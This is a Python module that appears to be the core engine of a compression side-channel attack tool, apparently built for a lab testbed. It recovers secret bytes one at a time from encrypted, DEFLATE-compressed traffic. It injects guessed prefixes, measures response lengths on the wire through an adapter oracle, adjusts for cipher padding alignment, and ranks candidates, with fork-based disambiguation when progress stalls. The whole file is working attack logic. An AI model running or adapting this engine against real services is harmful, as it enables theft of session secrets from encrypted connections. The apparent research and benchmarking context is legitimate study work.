"""Transport-agnostic engine: round loop, candidate ranking, metrics.

The engine calls adapter.measure_once(prefix, candidate, alignment) for
every oracle query. Everything else lives here.

aiohttp is imported inside run_attack() so pure-logic helpers are usable
on the host (where aiohttp is not installed — only inside the attacker
container).
"""

from __future__ import annotations

import dataclasses
import logging
import time
from typing import Any

from attacker.attack.adapters.base import Adapter
from attacker.attack.alignment import make_alignment
from attacker.attack.config import AttackConfig, AlignmentMode

LOG = logging.getLogger("attack.engine")


# ---------------------------------------------------------------------------
# Pure-logic helpers (unit-tested)
# ---------------------------------------------------------------------------

def _pick_alignment_with_largest_gap(
    per_nl: dict[int, dict[bytes, int]],
    best: bytes,
) -> int | None:
    """Return the alignment length at which `best` beats every other
    candidate by the most wire bytes, or None if no alignment shows any
    gap (e.g., single-candidate round, or all measurements identical).
    """
    sig_nl: int | None = None
    best_gap = 0
    for nl, vals in per_nl.items():
        if best not in vals:
            continue
        others = [v for c, v in vals.items() if c != best]
        if not others:
            continue
        gap = min(others) - vals[best]
        if gap > best_gap:
            best_gap = gap
            sig_nl = nl
    return sig_nl


def _select_initial_alignment(
    config: AttackConfig,
    prev_nl: int | None,
) -> list[int]:
    if config.alignment_mode == AlignmentMode.FIXED_SINGLE:
        return [config.alignment_lengths[0]]
    if config.alignment_hint_carryover and prev_nl is not None:
        if prev_nl in config.alignment_lengths:
            return [prev_nl]
    return list(config.alignment_lengths)


def _trimmed_prefix(
    known_prefix: bytes, recovered: bytes, config: AttackConfig,
) -> bytes:
    """Return the prefix that should be injected at the current position.

    When constant_prefix_trim is on, keep len(prefix) constant across
    positions by trimming the head of (known_prefix + recovered) so that
    its total length equals len(known_prefix). Keeps LZ77 match lengths
    in the same DEFLATE length-code bin at every position.
    """
    full = known_prefix + recovered
    if config.constant_prefix_trim:
        trim = max(0, len(full) - len(known_prefix))
        full = full[trim:]
    return full


def _fork_applicable(
    config: AttackConfig,
    position: int,
    pos_info: dict,
    depth: int,
) -> bool:
    """Return True if fork-on-stall should fire at (position, depth).

    Preconditions (all must hold):
      - config.candidate_fork_on_stall is True
      - the position did not cleanly commit
      - depth < config.max_fork_depth
      - position + depth + 1 < config.max_length (can still speculate one deeper)
    """
    if not config.candidate_fork_on_stall:
        return False
    if pos_info.get("clean_commit", False):
        return False
    if depth >= config.max_fork_depth:
        return False
    if position + depth + 1 >= config.max_length:
        return False
    return True


def _select_fork_branches(
    pos_info: dict,
    top_k: int,
    terminator: bytes,
) -> list[bytes]:
    """Pick fork-branch candidates from a stalled position's alive set.

    Returns up to K non-terminator candidates from the alive set (candidates
    not eliminated by candidate_elimination), ordered by ascending sums.
    Returns an empty list if fewer than 2 candidates remain after filtering
    — the caller should treat this as "fork not applicable, use best-margin
    fallback."

    If pos_info has no 'active_candidates' key (e.g., legacy test fixtures),
    fall back to all keys in sums — this preserves backward compat for
    tests that don't model elimination.
    """
    sums: dict[str, int] = pos_info["sums"]
    active_list = pos_info.get("active_candidates")
    if active_list is None:
        active_set = set(sums.keys())
    else:
        active_set = set(active_list)
    terminator_str = terminator.decode("latin-1")

    ranked = sorted(sums.items(), key=lambda kv: kv[1])

    branches: list[bytes] = []
    for key, _sum in ranked:
        if key == terminator_str:
            continue
        if key not in active_set:
            continue
        branches.append(key.encode("latin-1"))
        if len(branches) >= top_k:
            break

    if len(branches) < 2:
        return []
    return branches


def _classify_fork_outcome(
    branch_results: list[tuple[bytes, dict]],
) -> tuple[str, list[int]]:
    """Classify a fork round by how many branches cleanly committed.

    Returns one of:
      ("unique", [winner_idx])   — exactly 1 clean-committed branch
      ("multi",  [idx1, idx2, ...]) — 2+ clean-committed branches
      ("zero",   [])              — 0 clean-committed branches
    """
    clean_indices = [
        i for i, (_best, info) in enumerate(branch_results)
        if info.get("clean_commit", False)
    ]
    if len(clean_indices) == 1:
        return "unique", clean_indices
    if len(clean_indices) >= 2:
        return "multi", clean_indices
    return "zero", []


async def resolve_stalled_position(
    adapter: Adapter,
    config: AttackConfig,
    committed_prefix: bytes,
    position: int,
    stalled_pos_info: dict,
    alignment_hint: int | None,
    depth: int,
) -> list[dict]:
    """Disambiguate a stalled position by speculatively running the next one.

    Returns 1..(max_fork_depth + 1) position-info dicts. The first is the
    stalled position's final result with `fork_info` merged in; each
    subsequent dict is a position committed via a fork winner (marked
    `via_fork=True`).

    See docs/superpowers/specs/2026-04-22-fork-on-stall-design.md.
    """
    branches = _select_fork_branches(
        stalled_pos_info, config.fork_top_k, config.terminator,
    )
    if not branches:
        return [_fork_skipped_info(
            stalled_pos_info, position, reason="insufficient_branches",
        )]

    # Run each branch speculatively at position+1.
    branch_results: list[tuple[bytes, dict]] = []
    for branch_candidate in branches:
        hypothetical_recovered = committed_prefix + branch_candidate
        hypothetical_prefix = _trimmed_prefix(
            config.known_prefix, hypothetical_recovered, config,
        )
        initial_alignment = (
            [alignment_hint] if (alignment_hint is not None
                                 and alignment_hint in config.alignment_lengths
                                 and config.alignment_hint_carryover)
            else list(config.alignment_lengths)
        )
        result = await crack_byte_position(
            adapter=adapter, config=config,
            prefix=hypothetical_prefix,
            initial_alignment=initial_alignment,
            log_prefix=f"pos {position+1:2d} fork[{branch_candidate.decode('latin-1')}]",
        )
        branch_results.append(result)

    outcome, clean_indices = _classify_fork_outcome(branch_results)

    total_fork_guesses = sum(info["guesses"] for _b, info in branch_results)

    if outcome == "unique":
        winner_idx = clean_indices[0]
        winner_candidate = branches[winner_idx]
        winner_best_byte, winner_info = branch_results[winner_idx]
        # If the winner is not the lone clean branch from the loss
        # standpoint, losers = all non-winner branches
        losers_guesses = sum(
            info["guesses"] for i, (_b, info) in enumerate(branch_results)
            if i != winner_idx
        )
        origin = _fork_origin_info(
            stalled_pos_info,
            position=position,
            best_candidate=winner_candidate,
            depth_used=depth + 1,
            branches_run=len(branches),
            losers_guesses=losers_guesses,
            total_fork_guesses=total_fork_guesses,
            outcome="unique_clean",
            committed_via_fork=[position + 1],
        )
        winner_pos = {
            **winner_info,
            "position": position + 1,
            "via_fork": True,
            "fork_origin": position,
            "fork_info": None,
        }
        return [origin, winner_pos]

    # outcome is "multi" or "zero": try depth-2 if allowed AND in bounds.
    # max_fork_depth > 2 is silently capped at 2 (spec out-of-scope).
    can_attempt_depth2 = (
        config.max_fork_depth >= 2
        and position + 2 < config.max_length
    )
    if not can_attempt_depth2:
        # Depth-2 disabled or position+2 out of bounds: best-margin at N.
        return [_fork_origin_info(
            stalled_pos_info,
            position=position,
            best_candidate=branches[0],   # best-margin at N
            depth_used=1,
            branches_run=len(branches),
            losers_guesses=total_fork_guesses,
            total_fork_guesses=total_fork_guesses,
            outcome="best_margin_fallback",
            committed_via_fork=[],
        )]

    # Pick parent branches for depth-2:
    #   multi-clean -> only cleanly-committing branches
    #   zero-clean  -> all branches (each extended with its best-margin N+1)
    if outcome == "multi":
        parent_indices = list(clean_indices)
    else:  # zero
        parent_indices = list(range(len(branches)))

    # Run one crack_byte_position per parent at position+2, extending the
    # hypothetical prefix with that parent's N+1 best (clean-committed or
    # best-margin).
    depth2_results: list[tuple[int, tuple[bytes, dict]]] = []
    for p_idx in parent_indices:
        parent_candidate = branches[p_idx]
        parent_N1_byte, _parent_info = branch_results[p_idx]
        extended_recovered = committed_prefix + parent_candidate + parent_N1_byte
        hypothetical_prefix = _trimmed_prefix(
            config.known_prefix, extended_recovered, config,
        )
        initial_alignment = (
            [alignment_hint] if (alignment_hint is not None
                                 and alignment_hint in config.alignment_lengths
                                 and config.alignment_hint_carryover)
            else list(config.alignment_lengths)
        )
        d2_log = (
            f"pos {position+2:2d} fork2["
            f"{parent_candidate.decode('latin-1')}{parent_N1_byte.decode('latin-1')}]"
        )
        d2_result = await crack_byte_position(
            adapter=adapter, config=config,
            prefix=hypothetical_prefix,
            initial_alignment=initial_alignment,
            log_prefix=d2_log,
        )
        depth2_results.append((p_idx, d2_result))

    # Identify depth-2 clean winners.
    d2_clean = [
        (p_idx, r) for p_idx, r in depth2_results
        if r[1].get("clean_commit", False)
    ]
    d2_total_guesses = sum(r[1]["guesses"] for _p, r in depth2_results)
    d2_losers_guesses = sum(
        r[1]["guesses"] for p_idx, r in depth2_results
        if not r[1].get("clean_commit", False)
    )
    total_fork_guesses_all = total_fork_guesses + d2_total_guesses

    if len(d2_clean) == 1:
        # Winner found at depth 2.
        winner_p_idx, (winner_N2_byte, winner_N2_info) = d2_clean[0]
        winner_candidate_N = branches[winner_p_idx]
        winner_N1_byte, winner_N1_info = branch_results[winner_p_idx]

        # Losers: all depth-1 non-winner branches + all depth-2 non-winner results.
        losers_d1 = sum(
            info["guesses"] for i, (_b, info) in enumerate(branch_results)
            if i != winner_p_idx
        )
        losers_total = losers_d1 + d2_losers_guesses

        origin = _fork_origin_info(
            stalled_pos_info,
            position=position,
            best_candidate=winner_candidate_N,
            depth_used=2,
            branches_run=len(branches) + len(depth2_results),
            losers_guesses=losers_total,
            total_fork_guesses=total_fork_guesses_all,
            outcome="unique_clean",
            committed_via_fork=[position + 1, position + 2],
        )
        winner_n1 = {
            **winner_N1_info,
            "position": position + 1,
            "via_fork": True,
            "fork_origin": position,
            "fork_info": None,
        }
        winner_n2 = {
            **winner_N2_info,
            "position": position + 2,
            "via_fork": True,
            "fork_origin": position,
            "fork_info": None,
        }
        return [origin, winner_n1, winner_n2]

    # No unique depth-2 winner: fall back to best-margin at N.
    return [_fork_origin_info(
        stalled_pos_info,
        position=position,
        best_candidate=branches[0],
        depth_used=2,
        branches_run=len(branches) + len(depth2_results),
        losers_guesses=total_fork_guesses_all,
        total_fork_guesses=total_fork_guesses_all,
        outcome="best_margin_fallback",
        committed_via_fork=[],
    )]


# ---------------------------------------------------------------------------
# Fork-info constructors (pure)
# ---------------------------------------------------------------------------

def _fork_origin_info(
    stalled_pos_info: dict,
    *,
    position: int,
    best_candidate: bytes,
    depth_used: int,
    branches_run: int,
    losers_guesses: int,
    total_fork_guesses: int,
    outcome: str,
    committed_via_fork: list[int],
) -> dict:
    """Build the origin position's final info dict with fork_info merged."""
    return {
        **stalled_pos_info,
        "position": position,
        "best": best_candidate.decode("latin-1"),
        "guesses": stalled_pos_info["guesses"] + losers_guesses,
        "clean_commit": False,
        "via_fork": False,
        "fork_origin": None,
        "fork_info": {
            "triggered": True,
            "depth_used": depth_used,
            "branches_run": branches_run,
            "losers_guesses": losers_guesses,
            "total_fork_guesses": total_fork_guesses,
            "reason": None,
            "outcome": outcome,
            "committed_via_fork": list(committed_via_fork),
        },
    }


def _fork_skipped_info(
    stalled_pos_info: dict, position: int, reason: str,
) -> dict:
    """Build a fork-skipped position dict (terminator-only / max_length)."""
    return {
        **stalled_pos_info,
        "position": position,
        "via_fork": False,
        "fork_origin": None,
        "fork_info": {
            "triggered": False,
            "depth_used": 0,
            "branches_run": 0,
            "losers_guesses": 0,
            "total_fork_guesses": 0,
            "reason": reason,
            "outcome": None,
            "committed_via_fork": [],
        },
    }


# ---------------------------------------------------------------------------
# Per-position recovery
# ---------------------------------------------------------------------------

async def crack_byte_position(
    adapter: Adapter,
    config: AttackConfig,
    prefix: bytes,
    initial_alignment: list[int],
    log_prefix: str,
) -> tuple[bytes, dict[str, Any]]:
    sums: dict[bytes, int] = {c: 0 for c in config.alphabet}
    active_candidates = list(config.alphabet)
    active_alignment = list(initial_alignment)
    guesses = 0
    prev_margin = 0
    stall_count = 0

    # Chacha20's padding modulus, recovered from the configured set.
    # Matches the original code's `noise_lengths[-1] + 1`.
    n = max(config.alignment_lengths) + 1

    per_nl: dict[int, dict[bytes, int]] = {}
    best: bytes = active_candidates[0]
    margin = 0
    rnd = 0

    for rnd in range(1, config.max_rounds + 1):
        # One round with outlier-retry. If outlier_threshold == 0 we take
        # the first pass unconditionally. `guesses` counts every oracle
        # query, including those in discarded outlier rounds, because the
        # on-wire cost of the attack is what scenario benchmarks compare.
        while True:
            per_nl = {nl: {} for nl in active_alignment}
            for nl in active_alignment:
                alignment = make_alignment(nl)
                for c in active_candidates:
                    guesses += 1
                    per_nl[nl][c] = await adapter.measure_once(prefix, c, alignment)
            flat = [v for m in per_nl.values() for v in m.values()]
            if (
                config.outlier_threshold == 0
                or not flat
                or max(flat) - min(flat) <= config.outlier_threshold
            ):
                break
            LOG.info(
                "%s round=%d outlier min=%d max=%d (threshold=%d), retry",
                log_prefix, rnd, min(flat), max(flat), config.outlier_threshold,
            )

        for c in active_candidates:
            sums[c] += sum(per_nl[nl][c] for nl in active_alignment)
        ranked = sorted(active_candidates, key=lambda c: sums[c])
        best = ranked[0]
        second_sum = sums[ranked[1]] if len(ranked) > 1 else sums[best]
        margin = second_sum - sums[best]
        eliminated = 0

        if config.candidate_elimination:
            before = len(active_candidates)
            active_candidates = [
                c for c in ranked if sums[c] - sums[best] < config.min_margin
            ]
            if len(active_candidates) < 2:
                active_candidates = ranked[:2]
            eliminated = before - len(active_candidates)

        if config.adaptive_alignment and rnd == 1:
            productive = {
                nl for nl, m in per_nl.items() if min(m.values()) < max(m.values())
            }
            if productive:
                keep: set[int] = set()
                for nl in productive:
                    keep.add(nl)
                    keep.add((nl - 1) % n)
                    keep.add((nl + 1) % n)
                new_alignment = sorted(keep & set(config.alignment_lengths))
                if len(new_alignment) >= 3:
                    active_alignment = new_alignment

        if config.stall_detection:
            if margin <= prev_margin and eliminated == 0:
                stall_count += 1
            else:
                stall_count = 0
            prev_margin = margin
            if stall_count >= 2 and len(active_alignment) < len(config.alignment_lengths):
                expanded = set(active_alignment)
                for nl in list(expanded):
                    expanded.add((nl - 1) % n)
                    expanded.add((nl + 1) % n)
                active_alignment = sorted(expanded & set(config.alignment_lengths))
                stall_count = 0
                LOG.info("%s round=%d stall, expanding alignment", log_prefix, rnd)

        LOG.info(
            "%s round=%d best=%r sum=%d 2nd=%d margin=%d alive=%d align=%d",
            log_prefix, rnd, best.decode("latin-1"), sums[best],
            second_sum, margin, len(active_candidates), len(active_alignment),
        )
        if margin >= config.min_margin:
            break
    else:
        LOG.warning(
            "%s exhausted %d rounds, margin=%d (threshold=%d)",
            log_prefix, config.max_rounds, margin, config.min_margin,
        )

    successful_alignment = _pick_alignment_with_largest_gap(per_nl, best)
    ranked_all = sorted(config.alphabet, key=lambda c: sums[c])
    clean_commit = margin >= config.min_margin
    return best, {
        "position": log_prefix,
        "best": best.decode("latin-1"),
        "guesses": guesses,
        "rounds": rnd,
        "final_margin": margin,
        "successful_alignment": successful_alignment,
        "ranked_top5": [
            (c.decode("latin-1"), sums[c]) for c in ranked_all[:5]
        ],
        "clean_commit": clean_commit,
        "sums": {c.decode("latin-1"): sums[c] for c in ranked_all},
        "active_candidates": [c.decode("latin-1") for c in active_candidates],
    }


# ---------------------------------------------------------------------------
# Full attack
# ---------------------------------------------------------------------------

async def run_attack(
    adapter: Adapter,
    config: AttackConfig,
) -> dict[str, Any]:
    import aiohttp  # local import — not needed for host-side helper tests

    # The engine commits a recovered byte when it beats the second-best
    # candidate by `min_margin`, and a position loop stops only when the
    # committed byte equals `config.terminator`. For the terminator to
    # ever be committed it must be in the candidate alphabet, so append
    # it defensively here. Callers don't have to include it themselves.
    if config.terminator and config.terminator not in config.alphabet:
        config = dataclasses.replace(
            config, alphabet=list(config.alphabet) + [config.terminator],
        )

    LOG.info(
        "run_attack: variant=%s label=%r prefix=%r alphabet=%d max_len=%d "
        "mode=%s lengths=%s min_margin=%d max_rounds=%d",
        adapter.__class__.__name__, config.label,
        config.known_prefix, len(config.alphabet), config.max_length,
        config.alignment_mode.value, config.alignment_lengths,
        config.min_margin, config.max_rounds,
    )
    started = time.time()

    timeout = aiohttp.ClientTimeout(total=7200)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        await adapter.setup(config, session)
        try:
            recovered = b""
            per_position: list[dict[str, Any]] = []
            prev_nl: int | None = None

            position = 0
            done = False
            while position < config.max_length and not done:
                full_prefix = _trimmed_prefix(
                    config.known_prefix, recovered, config,
                )
                initial_alignment = _select_initial_alignment(config, prev_nl)

                best, pos_info = await crack_byte_position(
                    adapter=adapter,
                    config=config,
                    prefix=full_prefix,
                    initial_alignment=initial_alignment,
                    log_prefix=f"pos {position:2d}",
                )
                pos_info["position"] = position
                # Downstream consumers may not see these yet (adapter tests
                # don't touch run_attack), but normalise here for uniformity.
                pos_info.setdefault("via_fork", False)
                pos_info.setdefault("fork_origin", None)
                pos_info.setdefault("fork_info", None)

                if pos_info["clean_commit"] or not _fork_applicable(
                    config, position, pos_info, depth=0,
                ):
                    committed = [pos_info]
                else:
                    committed = await resolve_stalled_position(
                        adapter=adapter,
                        config=config,
                        committed_prefix=recovered,
                        position=position,
                        stalled_pos_info=pos_info,
                        alignment_hint=prev_nl,
                        depth=0,
                    )

                for pr in committed:
                    best_byte = pr["best"].encode("latin-1")
                    per_position.append(pr)
                    if pr["successful_alignment"] is not None:
                        prev_nl = pr["successful_alignment"]
                    if best_byte == config.terminator:
                        LOG.info("hit terminator at position %d -> done", pr["position"])
                        done = True
                        break
                    recovered += best_byte
                    LOG.info("recovered so far: %r", recovered.decode("latin-1"))

                position += len(committed)

            if not done and position >= config.max_length:
                LOG.warning("hit max_length=%d without terminator", config.max_length)
        finally:
            await adapter.teardown()

    elapsed = time.time() - started
    LOG.info("run_attack done in %.1fs: recovered=%r",
             elapsed, recovered.decode("latin-1"))
    return {
        "recovered": recovered.decode("latin-1"),
        "elapsed_seconds": elapsed,
        "total_guesses": sum(p["guesses"] for p in per_position),
        "per_position": per_position,
        "config_label": config.label,
    }
